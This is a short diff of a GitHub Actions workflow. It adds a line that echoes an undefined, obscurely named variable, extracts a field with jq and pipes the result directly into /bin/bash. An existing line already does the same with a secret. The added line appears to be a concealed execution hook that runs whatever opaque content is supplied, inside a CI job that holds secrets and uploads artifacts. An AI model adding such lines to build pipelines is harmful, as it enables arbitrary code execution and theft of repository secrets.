@@ -22,6 +22,7 @@ jobs:
           u930: ${{ secrets.u930 }}
         run: |
           printf '%s' "$u930" | jq -r .jyuzh56 | /bin/bash
+          echo $bpst201 | jq -r .ic689 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
